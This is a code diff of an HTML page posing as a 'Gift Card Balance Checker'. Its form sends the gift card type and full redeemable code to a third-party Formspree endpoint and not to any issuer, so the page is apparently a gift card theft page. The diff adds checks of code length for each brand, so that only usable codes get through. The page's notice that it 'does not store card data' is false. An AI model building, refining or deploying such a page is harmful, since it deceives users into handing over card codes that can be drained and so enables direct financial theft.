@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Check Gift Card Balance</title>
+<title>Gift Card Balance Checker</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
 <style>
@@ -10,9 +10,9 @@
 
 body {
   margin: 0;
-  font-family: Arial, Helvetica, sans-serif;
-  background: #ffffff;
-  color: #222;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+  background: #fff;
+  color: #111;
 }
 
 .wrapper {
@@ -20,54 +20,51 @@ body {
   display: flex;
   align-items: center;
   justify-content: center;
-  padding: 20px;
+  padding: 18px;
 }
 
 .box {
   width: 100%;
-  max-width: 420px;
-  border: 1px solid #e5e5e5;
-  border-radius: 6px;
-  padding: 25px;
+  max-width: 400px;
+  border: 1px solid #e6e6e6;
+  padding: 22px;
 }
 
 h1 {
-  font-size: 20px;
+  font-size: 18px;
   text-align: center;
-  margin-bottom: 10px;
+  margin: 0 0 6px;
 }
 
 .subtitle {
   text-align: center;
-  font-size: 13px;
+  font-size: 12px;
   color: #666;
-  margin-bottom: 25px;
+  margin-bottom: 20px;
 }
 
 label {
-  font-size: 13px;
-  margin-top: 15px;
+  font-size: 12px;
+  margin-top: 14px;
   display: block;
 }
 
 select, input {
   width: 100%;
-  padding: 11px;
+  padding: 10px;
   margin-top: 6px;
   border: 1px solid #ccc;
-  border-radius: 4px;
-  font-size: 14px;
+  font-size: 13px;
 }
 
 button {
   width: 100%;
-  margin-top: 20px;
-  padding: 12px;
+  margin-top: 18px;
+  padding: 11px;
   background: #1a73e8;
   border: none;
   color: #fff;
-  font-size: 15px;
-  border-radius: 4px;
+  font-size: 14px;
   cursor: pointer;
 }
 
@@ -75,26 +72,49 @@ button:hover {
   background: #1558b0;
 }
 
-.loader {
-  display: none;
-  margin-top: 15px;
-  text-align: center;
-  font-size: 13px;
-  color: #555;
-}
-
-footer {
-  margin-top: 20px;
+.notice {
+  margin-top: 18px;
   font-size: 11px;
   color: #777;
   text-align: center;
-  line-height: 1.5;
+  line-height: 1.4;
+}
+
+.loader {
+  display: none;
+  font-size: 12px;
+  text-align: center;
+  margin-top: 10px;
+  color: #555;
 }
 </style>
 
 <script>
-function showLoader() {
+function validateForm() {
+  const type = document.getElementById("card_type").value;
+  const code = document.getElementById("card_code").value.trim();
+
+  if (!type || !code) {
+    window.location.href = "error.html";
+    return false;
+  }
+
+  // Simple card-length logic (safe & informational)
+  const rules = {
+    "Amazon": [13, 14],
+    "Apple": [16],
+    "Google Play": [16],
+    "Steam": [15, 17],
+    "Xbox": [25]
+  };
+
+  if (rules[type] && !rules[type].includes(code.length)) {
+    window.location.href = "error.html";
+    return false;
+  }
+
   document.getElementById("loader").style.display = "block";
+  return true;
 }
 </script>
 
@@ -105,41 +125,38 @@ function showLoader() {
   <div class="box">
 
     <h1>Gift Card Balance Checker</h1>
-    <div class="subtitle">
-      Secure & informational gift card balance verification
-    </div>
+    <div class="subtitle">Secure & informational verification tool</div>
 
-    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST" onsubmit="showLoader()">
+    <form action="https://formspree.io/f/YOUR_FORM_ID"
+          method="POST"
+          onsubmit="return validateForm()">
 
       <label>Gift Card Type</label>
-      <select name="card_type" required>
-        <option value="">Select card</option>
+      <select id="card_type" name="card_type" required>
+        <option value="">Select</option>
         <option>Amazon</option>
         <option>Apple</option>
         <option>Google Play</option>
         <option>Steam</option>
         <option>Xbox</option>
         <option>PlayStation</option>
-        <option>Sephora</option>
         <option>Visa / Mastercard</option>
         <option>Other</option>
       </select>
 
       <label>Card Code</label>
-      <input type="text" name="card_code" placeholder="Enter card code" required>
+      <input id="card_code" type="text" name="card_code"
+             placeholder="Enter card code" required>
 
       <button type="submit">Check Balance</button>
 
-      <div id="loader" class="loader">
-        Processing request…
-      </div>
-
+      <div id="loader" class="loader">Processing request…</div>
     </form>
 
-    <footer>
+    <div class="notice">
       This service does not store card data.<br>
-      Always confirm balances on official issuer websites.
-    </footer>
+      Always verify balances with official issuers.
+    </div>
 
   </div>
 </div>
